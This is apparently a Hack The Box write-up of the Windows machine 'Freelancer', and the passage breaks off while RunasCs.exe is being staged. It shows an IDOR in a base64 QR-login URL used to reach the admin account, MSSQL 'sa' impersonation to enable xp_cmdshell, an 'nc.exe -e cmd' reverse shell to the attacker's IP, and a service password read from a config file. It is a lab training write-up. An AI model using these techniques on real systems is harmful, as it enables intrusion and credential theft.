---
layout: writeup
category: HTB
description: Freelancer is a windows machine with a lot of techniques like web and active directory. First, I will activate my account with a forgot password functionality to take advantage of an IDOR in a QR code and login as admin. Then in the admin's panel, I have the ability to execute sql commands so I can use xp_cmdshell to execute a system command and gain a reverse shell as sql_svc. From that access, it's possible to see a sql installation configuration in the Downloads directory and a password that is reused for mikasa in the system. Now I have access to read email that leds to a .dmp file (which is a memory dump file) and I will dump its info to retrieve a password for lorra199. Finally, looking at the lorra199 ACLs, I can see that her group has GenericWrite on the DC so I can add a computer with specified credentials and dump all the nt hashes using secretsdump including the Administrator's one.
points: 40
solves: 
tags: forgot-password idor qrcode mssql xp_cmdshell sql-configuration crash-dump-analysis active-directory-acls genericwrite nt-hashes secretsdump
date: 2024-10-05
title: HTB Freelancer writeup
comments: false
---

{% raw %}

Freelancer is a windows machine with a lot of techniques like web and active directory. First, I will activate my account with a forgot password functionality to take advantage of an IDOR in a QR code and login as admin. Then in the admin's panel, I have the ability to execute sql commands so I can use xp_cmdshell to execute a system command and gain a reverse shell as sql_svc. From that access, it's possible to see a sql installation configuration in the Downloads directory and a password that is reused for mikasa in the system. Now I have access to read email that leds to a .dmp file (which is a memory dump file) and I will dump its info to retrieve a password for lorra199. Finally, looking at the lorra199 ACLs, I can see that her group has GenericWrite on the DC so I can add a computer with specified credentials and dump all the nt hashes using secretsdump including the Administrator's one.

# Port recognaissance

```bash
❯ sudo nmap -sS --open -p- --min-rate 5000 -v -n -Pn -sVC 10.10.11.5 -oA Freelancer
<..SNIP..>
```

```bash
❯ cat Freelancer.nmap
# Nmap 7.94SVN scan initiated Tue Oct  1 20:01:02 2024 as: nmap -sS --open -p- --min-rate 5000 -v -n -Pn -sVC -oA Freelancer 10.10.11.5
Nmap scan report for 10.10.11.5
Host is up (0.36s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         nginx 1.25.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://freelancer.htb/
|_http-server-header: nginx/1.25.5
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-01 23:01:25Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  1 20:02:33 2024 -- 1 IP address (1 host up) scanned in 91.05 seconds
```

> [My used arguments for nmap](http://gabrielgonzalez211.github.io/blog/nmap-arguments.html)

I can see a bunch of ports open which I classified as the following:

**Active directory ports**:
- 88,464 (kerberos) -> used for authentication against the domain
- 135, 593, 49664, 49665, ... (rpc) -> used to communicate to some objects of active directory
- 139,445 (SMB) -> used to share files and use named pipes
- 389 (ldap) -> used for active directory to store data of the domain and it's accessible using valid sessions. The nmap scan reveals it uses the domain freelancer.htb, which I already added to my /etc/hosts

**Web:**
- 80 (HTTP) -> web page that uses nginx 1.25.5 and redirects to freelancer.htb so I'll add it to my /etc/hosts for my system to know to which IP should solve that domain:
```bash
❯ sudo vi /etc/hosts
10.10.11.5 freelancer.htb
```

# Active directory enumeration

I will proceed to enumerate active directory without credentials as it's simpler than web.

## RPC

Using possible null session combinations doesn't work:

```bash
❯ rpcclient -N 10.10.11.5
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
❯ rpcclient -U "freelancer.htb/%" 10.10.11.5
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
❯ rpcclient -U "freelancer.htb/test%test" 10.10.11.5
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
❯ rpcclient -U "freelancer.htb/test%" 10.10.11.5
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
❯ rpcclient -U "freelancer.htb/%" 10.10.11.5
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

And it won't work in SMB because it uses the same authentication (NTLM). And in reality rpcclient uses IPC$ share to look for information instead of the port 135 (MSRPC).

# Web enumeration (Port 80)

Taking a look at the http headers with curl, I don't see nothing interesting that I didn't saw with nmap:

```bash
❯ curl -s -i http://10.10.11.5
HTTP/1.1 302 Found
Server: nginx/1.25.5
Date: Fri, 04 Oct 2024 00:39:07 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: http://freelancer.htb/
```

And as it redirects to freelancer.htb, I will take a look to it the same way:

```bash
❯ curl -s -i http://freelancer.htb | less
HTTP/1.1 200 OK
Server: nginx/1.25.5
Date: Fri, 04 Oct 2024 21:00:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 57293
Connection: keep-alive
Vary: Accept-Encoding
Cross-Origin-Opener-Policy: same-origin
Referrer-Policy: same-origin
X-Content-Type-Options: nosniff
X-Frame-Options: DENY

<!doctype html>
<html lang="zxx">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Links of CSS files -->
    <link rel="stylesheet" href="/static/assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/assets/css/aos.css">
    <link rel="stylesheet" href="/static/assets/css/animate.min.css">
    <link rel="stylesheet" href="/static/assets/css/meanmenu.css">
    <link rel="stylesheet" href="/static/assets/css/flaticon.css">
    <link rel="stylesheet" href="/static/assets/css/remixicon.css">
    <link rel="stylesheet" href="/static/assets/css/odometer.min.css">
    <link rel="stylesheet" href="/static/assets/css/owl.carousel.min.css">
    <link rel="stylesheet" href="/static/assets/css/owl.theme.default.min.css">
    <link rel="stylesheet" href="/static/assets/css/magnific-popup.min.css">
    <link rel="stylesheet" href="/static/assets/css/fancybox.min.css">
    <link rel="stylesheet" href="/static/assets/css/selectize.min.css">
    <link rel="stylesheet" href="/static/assets/css/metismenu.min.css">
    <link rel="stylesheet" href="/static/assets/css/simplebar.min.css">
    <link rel="stylesheet" href="/static/assets/css/dropzone.min.css">
    <link rel="stylesheet" href="/static/assets/css/style.css">
    <link rel="stylesheet" href="/static/assets/css/navbar.css">
    <link rel="stylesheet" href="/static/assets/css/footer.css">
    <link rel="stylesheet" href="/static/assets/css/dashboard.css">
    <link rel="stylesheet" href="/static/assets/css/responsive.css">

    <title>Freelancer - Job Board & Hiring platform</title>

    <link rel="icon" type="image/png" href="/static/assets/images/favicon.png">
</head>
```

It's about a job board & hiring platform. Now filtering for links, I can see it has a bunch of functionalities:

```bash
❯ curl -s -i http://freelancer.htb | grep -i '<a' | grep -v 'href="#"' | grep -oP 'href="[^"]+"' | sed 's/href="\(.*\)"/\1/g' | sort -u > links
❯ cat links
/
/about/
/accounts/login/
/accounts/profile/
/accounts/profile/visit/12/
/accounts/profile/visit/13/
/accounts/profile/visit/14/
/blog/
/contact/
/employer/register/
/freelancer/register/
/job/create/
/job/search/
/job/search/?q=&type=&industry=Business
/job/search/?q=&type=&industry=Digital & Creative
/job/search/?q=&type=&industry=Email Marketing
/job/search/?q=&type=&industry=Human Resources
/job/search/?q=&type=&industry=IT
/job/search/?q=&type=&industry=Management
/job/search/?q=&type=&industry=Math
/job/search/?q=&type=&industry=Office
/job/search/?q=&type=&industry=Software Development
/job/search/?q=&type=&industry=Teaching
/job/search/?q=&type=&industry=Web Articles
blog/details/?article_id=1
blog/details/?article_id=10
blog/details/?article_id=11
blog/details/?article_id=12
blog/details/?article_id=2
blog/details/?article_id=3
blog/details/?article_id=4
blog/details/?article_id=5
blog/details/?article_id=6
blog/details/?article_id=7
blog/details/?article_id=8
blog/details/?article_id=9
details/?article_id=1
details/?article_id=10
details/?article_id=11
details/?article_id=12
details/?article_id=2
details/?article_id=3
details/?article_id=4
details/?article_id=5
details/?article_id=6
details/?article_id=7
details/?article_id=8
details/?article_id=9
http://freelancer.htb/
https://linkedin.com/
https://twitter.com/
https://www.instagram.com/
https://www.linkedin.com/
https://www.youtube.com/
mailto:support@freelancer.htb
tel:00901361246725
```

> Explanation of the command: The command I executed to extract the link just makes a curl to the main page, it matches the lines containing a link html tag `<a` (`grep -i '<a'`), filters all the matches that consists in a link to nothing (`#`) with `grep -v 'href="#"'`. Then, it matches the exact regex of `href="[^"]+"` (`grep -oP 'href="[^"]+"'`) to show only the `href="<link>"` part and it makes a sustitution for `href="\(.*\)"` to be just `.*` by using a capturing group and later referencing it with `\1` (`sed 's/href="\(.*\)"/\1/g'`).

The web looks like this:

![](/assets/images/Freelancer/Pasted%20image%2020241004183952.png)

There are two register types, one for employer and another for a freelancer (typical of freelancer platforms):

![](/assets/images/Freelancer/Pasted%20image%2020241004193916.png)

There are also links to profiles in a part of the page with an id so I can enumerate users:

![](/assets/images/Freelancer/Pasted%20image%2020241005091528.png)

But login is required to view it:

![](/assets/images/Freelancer/Pasted%20image%2020241005091600.png)

The freelancer (the one who does the job) register looks like this:

![](/assets/images/Freelancer/Pasted%20image%2020241005090000.png)

And the employer (the one who hires the freelancer) register looks like this and it says that the account will be inactive until our team reviews my account details and contacts me by email to activate my account:

![](/assets/images/Freelancer/Pasted%20image%2020241005090239.png)

I will register an employer account with username gabriEmployer:

![](/assets/images/Freelancer/Pasted%20image%2020241005090810.png)

When trying to login, i have a message saying that is not activated (like the register message said):

![](/assets/images/Freelancer/Pasted%20image%2020241005091013.png)

![](/assets/images/Freelancer/Pasted%20image%2020241005091023.png)

However there's a forgot password link there which asks for the security questions to reset my password:

![](/assets/images/Freelancer/Pasted%20image%2020241005092656.png)

I will enter them and after that, I can reset my password:

![](/assets/images/Freelancer/Pasted%20image%2020241005092747.png)

![](/assets/images/Freelancer/Pasted%20image%2020241005092929.png)

The link seems suspicious because that base64 string, which corresponds to an id, in this case 10011:

```bash
❯ echo -n 'MTAwMTE=' | base64 -d; echo
10011
```

But if I try changing it to 1 or 2, it gives 500 error so it's well configured:

```bash
❯ echo -n 1 | base64 -w 0; echo
MQ==
```

![](/assets/images/Freelancer/Pasted%20image%2020241005093155.png)

```bash
❯ echo -n 2 | base64 -w 0; echo
Mg==
```

![](/assets/images/Freelancer/Pasted%20image%2020241005093238.png)

Going back to resetting my password, let's see if it activates my account:

![](/assets/images/Freelancer/Pasted%20image%2020241005093412.png)

It doesn't gives me any message and it redirects me to the login page. I will try to login and it works!

![](/assets/images/Freelancer/Pasted%20image%2020241005093503.png)

![](/assets/images/Freelancer/Pasted%20image%2020241005093540.png)

So resetting my password activates my account.

Now, I can see profiles of other users:

![](/assets/images/Freelancer/Pasted%20image%2020241005093709.png)

I will scrap this page with IDs from 1 to 10100 to enumerate usernames but first I need to know where are showed:

```bash
❯ curl -s http://freelancer.htb/accounts/profile/visit/12/ -H "Cookie: sessionid=b0r060kmv3946cnyylp3strymp80ev08; csrftoken=b0r060kmv3946cnyylp3strymp80ev08" | less
```

All the profile information it's inside a div with the class `employers-details-information`

![](/assets/images/Freelancer/Pasted%20image%2020241005094607.png)

I will use the tool `pup` (install it with `sudo apt install pup -y`) to extract all the information inside the div with that class:

```bash
❯ curl -s http://freelancer.htb/accounts/profile/visit/12/ -H "Cookie: sessionid=b0r060kmv3946cnyylp3strymp80ev08; csrftoken=b0r060kmv3946cnyylp3strymp80ev08" | pup 'div.employers-details-information' | pup 'div.information-box h3, div.information-box span, ul.information-list-box li div' | html2text
**** Jonathon.R ****
Jonathon Roman
Address: USA - Las Vegas
Email: jroman1992@gmail.com
Job Title: IT Specialist
Years of Experience: 8
Description: I am an accomplished IT Specia
Joined At: 2022-02-01
```

> The `h3` inside `div.information-box` contains the username, the `span` inside the same div contains the fullname and the a `div` inside a `li` inside a `ul` with class `information-list-box` contains the user information. The tool `html2text` parses the html and converts it so well to a pretty format.


Now I will loop from 1 to 10100 to extract all the possible usernames and put them into a file `profilesInfo.txt`. It finds users till ID 14 so I stopped it there (I was watching with `tail -f profilesInfo.txt` while it was running):

```bash
❯ for profileId in $(seq 1 10100); do echo -ne "\rProfile $profileId"; (echo -ne "\n\n[+] Profile $profileId\n\n"; curl -s "http://freelancer.htb/accounts/profile/visit/$profileId/" -H "Cookie: sessionid=b0r060kmv3946cnyylp3strymp80ev08; csrftoken=b0r060kmv3946cnyylp3strymp80ev08" | pup 'div.employers-details-information' | pup 'div.information-box h3, div.information-box span, ul.information-list-box li div' | html2text) 2>/dev/null >> profilesInfo.txt;done
```

```bash
❯ cat profilesInfo.txt



[+] Profile 1



[+] Profile 2

**** admin ****
John Halond
Company Name: Freelancer LTD
Address: US East - Boston
Phone NUmber:
Email: johnHalond@freelancer.htb
Joined At: 2020-11-12
Job Position:


[+] Profile 3

**** tomHazard ****
Tom Hazard
Company Name: Freelancer LTD
Address: US West - Los Angeles
Phone NUmber:
Email: tomHazard@freelancer.htb
Joined At: 2020-01-19
Job Position:


[+] Profile 4

**** martin1234 ****
Martin Rose
Company Name: Doodle Grive Ltd
Address: Canada West - Vancouver
Phone NUmber:
Email: martin.rose@hotmail.com
Joined At: 2021-02-01
Job Position:


[+] Profile 5

**** crista.W ****
Crista Watterson
Company Name: Pixar
Address: Germany - Frankfurt
Phone NUmber:
Email: crista.Watterson@gmail.com
Joined At: 2022-03-12
Job Position:


[+] Profile 6

**** Camellia19970 ****
Camellia Renesa
Company Name: Athento
Address: Italy - Milan
Phone NUmber:
Email: Camellia@athento.com
Joined At: 2024-01-19
Job Position:


[+] Profile 7

**** lisa.Ar ****
Lisa Arkhader
Address: UK - London
Email: lisa.Arkhader@outlook.com
Job Title: Software Developer
Years of Experience: 6
Description: Another talented Software Deve
Joined At: 2024-01-19


[+] Profile 8

**** SaraArkhader ****
Sara Arkhader
Address: US - Atlanta
Email: SaraArkhader@gmail.com
Job Title: CyberHacker
Years of Experience: 4
Description: Another talented CyberHacker
Joined At: 2024-02-02


[+] Profile 9

**** maya001 ****
Maya Ackasha
Address: Egypt - Cairo
Email: maya001@hotmail.com
Job Title: Flatter Developer
Years of Experience: 2
Description: ^__^ ... -__-
Joined At: 2024-02-05


[+] Profile 10

**** ItachiUchiha ****
Itachi Uchiha
Address: The village of Konohagakure
Email: itachi.uchiha@gmail.com
Job Title: Ninja
Years of Experience: 22
Description: A peaceful Ninja.... ^--^
Joined At: 2004-01-11


[+] Profile 11

**** Philippos ****
Philip Marcos
Address: USA - Washington
Email: philippos007@hacktheworld.eu
Job Title: Hacker
Years of Experience: 4
Description: 4 years expreinced Hacker
Joined At: 2024-01-11


[+] Profile 12

**** Jonathon.R ****
Jonathon Roman
Address: USA - Las Vegas
Email: jroman1992@gmail.com
Job Title: IT Specialist
Years of Experience: 8
Description: I am an accomplished IT Specia
Joined At: 2022-02-01


[+] Profile 13

**** JohntheCarter ****
John Carter
Address: Canada West - Vancouver
Email: johnholand@secretareas.com
Job Title: Ui/Ux Designer
Years of Experience: 11
Description: 11 years expreinced Ui/Ux Desi
Joined At: 2020-03-10


[+] Profile 14

**** Markos ****
Mark Rose
Address: UK - London
Email: mark.rose@yahoo.com
Job Title: Email Marketer
Years of Experience: 6
Description: 6 years expreinced Email Marke
Joined At: 2020-01-19


[+] Profile 15



[+] Profile 16



[+] Profile 17



[+] Profile 18



[+] Profile 19

<..SNIP..>
```

Mi ID was 10011 and it works with this snippet:

```bash
❯ curl -s http://freelancer.htb/accounts/profile/visit/10011/ -H "Cookie: sessionid=b0r060kmv3946cnyylp3strymp80ev08; csrftoken=b0r060kmv3946cnyylp3strymp80ev08" | pup 'div.employers-details-information' | pup 'div.information-box h3, div.information-box span, ul.information-list-box li div' | html2text 2>/dev/null
**** gabriEmployer ****
gabri gabri
Company Name: GabriCompany
Address: gabri house
Phone NUmber:
Email: gabriEmployeer@freelancer.htb
Joined At: 2024-10-05
Job Position:
```

That's the case because the first new user begun with ID 10010 and the newest have a incremental ID. In my case I can see another hackthebox player that created an account `test`:

```bash
❯ for profileId in $(seq 10000 10011);do (echo -ne "\n\n[+] Profile $profileId\n\n"; curl -s "http://freelancer.htb/accounts/profile/visit/$profileId/" -H "Cookie: sessionid=b0r060kmv3946cnyylp3strymp80ev08; csrftoken=b0r060kmv3946cnyylp3strymp80ev08" | pup 'div.employers-details-information' | pup 'div.information-box h3, div.information-box span, ul.information-list-box li div' | html2text) 2>/dev/null;done


[+] Profile 10000



[+] Profile 10001



[+] Profile 10002



[+] Profile 10003



[+] Profile 10004



[+] Profile 10005



[+] Profile 10006



[+] Profile 10007



[+] Profile 10008



[+] Profile 10009



[+] Profile 10010

**** test ****
test test
Company Name: test
Address: test
Phone NUmber:
Email: test@test.com
Joined At: 2024-10-05
Job Position:


[+] Profile 10011

**** gabriEmployer ****
gabri gabri
Company Name: GabriCompany
Address: gabri house
Phone NUmber:
Email: gabriEmployeer@freelancer.htb
Joined At: 2024-10-05
Job Position:
```

Well, going back to the enumerated users, I can see that the admin user has an id 2 but nothing more interesting:

```bash
❯ awk '{print} /\[\+\] Profile 15/ {exit}' profilesInfo.txt



[+] Profile 1



[+] Profile 2

**** admin ****
John Halond
Company Name: Freelancer LTD
Address: US East - Boston
Phone NUmber:
Email: johnHalond@freelancer.htb
Joined At: 2020-11-12
Job Position:


[+] Profile 3

**** tomHazard ****
Tom Hazard
Company Name: Freelancer LTD
Address: US West - Los Angeles
Phone NUmber:
Email: tomHazard@freelancer.htb
Joined At: 2020-01-19
Job Position:


[+] Profile 4

**** martin1234 ****
Martin Rose
Company Name: Doodle Grive Ltd
Address: Canada West - Vancouver
Phone NUmber:
Email: martin.rose@hotmail.com
Joined At: 2021-02-01
Job Position:


[+] Profile 5

**** crista.W ****
Crista Watterson
Company Name: Pixar
Address: Germany - Frankfurt
Phone NUmber:
Email: crista.Watterson@gmail.com
Joined At: 2022-03-12
Job Position:


[+] Profile 6

**** Camellia19970 ****
Camellia Renesa
Company Name: Athento
Address: Italy - Milan
Phone NUmber:
Email: Camellia@athento.com
Joined At: 2024-01-19
Job Position:


[+] Profile 7

**** lisa.Ar ****
Lisa Arkhader
Address: UK - London
Email: lisa.Arkhader@outlook.com
Job Title: Software Developer
Years of Experience: 6
Description: Another talented Software Deve
Joined At: 2024-01-19


[+] Profile 8

**** SaraArkhader ****
Sara Arkhader
Address: US - Atlanta
Email: SaraArkhader@gmail.com
Job Title: CyberHacker
Years of Experience: 4
Description: Another talented CyberHacker
Joined At: 2024-02-02


[+] Profile 9

**** maya001 ****
Maya Ackasha
Address: Egypt - Cairo
Email: maya001@hotmail.com
Job Title: Flatter Developer
Years of Experience: 2
Description: ^__^ ... -__-
Joined At: 2024-02-05


[+] Profile 10

**** ItachiUchiha ****
Itachi Uchiha
Address: The village of Konohagakure
Email: itachi.uchiha@gmail.com
Job Title: Ninja
Years of Experience: 22
Description: A peaceful Ninja.... ^--^
Joined At: 2004-01-11


[+] Profile 11

**** Philippos ****
Philip Marcos
Address: USA - Washington
Email: philippos007@hacktheworld.eu
Job Title: Hacker
Years of Experience: 4
Description: 4 years expreinced Hacker
Joined At: 2024-01-11


[+] Profile 12

**** Jonathon.R ****
Jonathon Roman
Address: USA - Las Vegas
Email: jroman1992@gmail.com
Job Title: IT Specialist
Years of Experience: 8
Description: I am an accomplished IT Specia
Joined At: 2022-02-01


[+] Profile 13

**** JohntheCarter ****
John Carter
Address: Canada West - Vancouver
Email: johnholand@secretareas.com
Job Title: Ui/Ux Designer
Years of Experience: 11
Description: 11 years expreinced Ui/Ux Desi
Joined At: 2020-03-10


[+] Profile 14

**** Markos ****
Mark Rose
Address: UK - London
Email: mark.rose@yahoo.com
Job Title: Email Marketer
Years of Experience: 6
Description: 6 years expreinced Email Marke
Joined At: 2020-01-19


[+] Profile 15
```


Let's go back to the dashboard page, where QR Code looks interesting as I can login with a QR code:

![](/assets/images/Freelancer/Pasted%20image%2020241005104438.png)

After downloading it (right-click, "Save image as"), I can see the content inside with the `zbarimg` tool (it is possible to install it with `sudo apt install zbar-tools`). It's a link to `http://freelancer.htb/accounts/login/otp/MTAwMTE=/a415ef08c82cc53bee880242a16579f3/`:

```bash
❯ zbarimg --raw qrcode.png 2>/dev/null
http://freelancer.htb/accounts/login/otp/MTAwMTE=/a415ef08c82cc53bee880242a16579f3/
```

If I logout and enter this url in the browser, I can login to my account:

![](/assets/images/Freelancer/Pasted%20image%2020241005110408.png)

![](/assets/images/Freelancer/Pasted%20image%2020241005110415.png)

Here it's also used the base64 id, which in my case it's 10011:

```bash
❯ echo -n 'MTAwMTE=' | base64 -d;echo
10011
```

What if I replace my ID with the admin's ID which is 2 as I saw in the users enumeration of before? First, I need to generate another QRCode because when it's not the first time is used, it expires:

![](/assets/images/Freelancer/Pasted%20image%2020241005110649.png)

I downloaded another qrcode from the page and now it's a different link:

```bash
❯ zbarimg --raw qrcode.png 2>/dev/null
http://freelancer.htb/accounts/login/otp/MTAwMTE=/107c428ad90f6354b2bae3d6bc29f3eb/
```

And I can replace that base64 ID of 10011 to the base64 ID of 2 which belongs to admin:

```bash
❯ zbarimg --raw qrcode.png 2>/dev/null | sed "s/MTAwMTE=/$(echo -n 2 | base64 -w 0)/g"
http://freelancer.htb/accounts/login/otp/Mg==/107c428ad90f6354b2bae3d6bc29f3eb/
```

And after entering that URL in the browser, I'm logged in as admin:

![](/assets/images/Freelancer/Pasted%20image%2020241005110938.png)

# Access as sql_svc

I exploited an IDOR vulnerability. But there are no new interesting endpoints here, so I will 
fuzz in search of valid routes:

```bash
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://freelancer.htb/FUZZ -mc all -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://freelancer.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

.bash_history           [Status: 503, Size: 197, Words: 7, Lines: 8, Duration: 373ms]
.listing                [Status: 503, Size: 197, Words: 7, Lines: 8, Duration: 373ms]
.history                [Status: 503, Size: 197, Words: 7, Lines: 8, Duration: 373ms]
.swf                    [Status: 503, Size: 197, Words: 7, Lines: 8, Duration: 373ms]
.git/HEAD               [Status: 503, Size: 197, Words: 7, Lines: 8, Duration: 373ms]
.cvs                    [Status: 503, Size: 197, Words: 7, Lines: 8, Duration: 373ms]
.git-rewrite            [Status: 503, Size: 197, Words: 7, Lines: 8, Duration: 373ms]
.listings               [Status: 503, Size: 197, Words: 7, Lines: 8, Duration: 373ms]
.svnignore              [Status: 503, Size: 197, Words: 7, Lines: 8, Duration: 373ms]
about                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 809ms]
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 810ms]
blog                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 803ms]
contact                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 689ms]
:: Progress: [4734/4734] :: Job [1/1] :: 50 req/sec :: Duration: [0:01:39] :: Errors: 0 ::
```

I can see the route `admin` which I didn't saw before. It's another completely different panel:

![](/assets/images/Freelancer/Pasted%20image%2020241005111645.png)

There's a tool SQL Terminal which lets me execute MSSQL commands:

![](/assets/images/Freelancer/Pasted%20image%2020241005111803.png)

The database doesn't have nothing interesting and the hashes are not crackable. However, I can try to execute command with xp_cmdshell but I don't have access:

![](/assets/images/Freelancer/Pasted%20image%2020241005115110.png)

My current user is Freelancer_webapp_user:

![](/assets/images/Freelancer/Pasted%20image%2020241005115219.png)

And I'm not an admin:

![](/assets/images/Freelancer/Pasted%20image%2020241005115328.png)

There are two users, `sa` and `Freelancer_webapp_user`:

![](/assets/images/Freelancer/Pasted%20image%2020241005115416.png)

And they don't have passwords!

![](/assets/images/Freelancer/Pasted%20image%2020241005115523.png)

User `sa` is the default administrator so I can try login as him to execute any query as him and it works:

![](/assets/images/Freelancer/Pasted%20image%2020241005120001.png)

Now,  I will enable xp_cmdshell for being able to execute commands:

![](/assets/images/Freelancer/Pasted%20image%2020241005120107.png)

And now I can execute any command I want. I'm sql_svc user:

![](/assets/images/Freelancer/Pasted%20image%2020241005120157.png)

Now I will execute a command that gives me a shell on port 443. For that, I will download [nc.exe](https://eternallybored.org/misc/netcat/) to my attacker machine and execute it from the victim by downloading it and executing it.

First, I will start the http server to share `nc.exe` and a nc listener on my machine to receive the shell:

```bash
❯ ls; echo;echo;python3 -m http.server 80
nc.exe


Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

![](/assets/images/Freelancer/Pasted%20image%2020241005123820.png)

And now I have a shell as sql_svc:

![](/assets/images/Freelancer/Pasted%20image%2020241005122131.png)

Now, I will start another nc listener and execute the command again in background because when some time passes, the shell is killed:

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

```cmd
C:\WINDOWS\system32>C:\Windows\Temp\nc.exe -e cmd 10.10.14.91 443 &
```

# Access as mikasaAckerman

There are a lot of users:

```cmd
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8954-28AE

 Directory of C:\Users

05/28/2024  10:19 AM    <DIR>          .
05/28/2024  10:19 AM    <DIR>          ..
10/05/2024  10:46 AM    <DIR>          Administrator
05/28/2024  10:23 AM    <DIR>          lkazanof
05/28/2024  10:23 AM    <DIR>          lorra199
05/28/2024  10:22 AM    <DIR>          mikasaAckerman
08/27/2023  01:16 AM    <DIR>          MSSQLSERVER
05/28/2024  02:13 PM    <DIR>          Public
05/28/2024  10:22 AM    <DIR>          sqlbackupoperator
10/05/2024  10:47 AM    <DIR>          sql_svc
               0 File(s)              0 bytes
              10 Dir(s)   2,609,459,200 bytes free
```

Taking a look at my user directory, I can see a SQL installation directory in Downloads:

```cmd
C:\Users\sql_svc>tree /a
tree /a
Folder PATH listing
Volume serial number is FFFFFFFE 8954:28AE
C:.
+---3D Objects
+---Contacts
+---Desktop
+---Documents
+---Downloads
|   \---SQLEXPR-2019_x64_ENU
|       +---1033_ENU_LP
|       |   \---x64
|       |       +---1033
|       |       \---Setup
|       |           \---x64
|       +---redist
|       |   \---VisualStudioShell
|       |       \---VCRuntimes
|       +---resources
|       |   \---1033
|       \---x64
|           \---Setup
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
```

And there is a file sql-Configuration.INI which the password `IL0v3ErenY3ager`:

```cmd
C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8954-28AE

 Directory of C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU

05/27/2024  01:52 PM    <DIR>          .
05/27/2024  01:52 PM    <DIR>          ..
05/27/2024  01:52 PM    <DIR>          1033_ENU_LP
09/24/2019  09:00 PM                45 AUTORUN.INF
09/24/2019  09:00 PM               784 MEDIAINFO.XML
09/29/2023  04:49 AM                16 PackageId.dat
05/27/2024  01:52 PM    <DIR>          redist
05/27/2024  01:52 PM    <DIR>          resources
09/24/2019  09:00 PM           142,944 SETUP.EXE
09/24/2019  09:00 PM               486 SETUP.EXE.CONFIG
05/27/2024  04:58 PM               724 sql-Configuration.INI
09/24/2019  09:00 PM           249,448 SQLSETUPBOOTSTRAPPER.DLL
05/27/2024  01:52 PM    <DIR>          x64
               7 File(s)        394,447 bytes
               6 Dir(s)   2,609,393,664 bytes free
```

```cmd
C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU>type sql-configuration.ini
type sql-configuration.ini
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3mp0r@ryS@PWD"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

I will download RunasCs.exe to the victim machine to see to which user works:

```bash
❯ ls; echo;echo;python3 -m http.server 80
nc.exe  RunasCs.exe


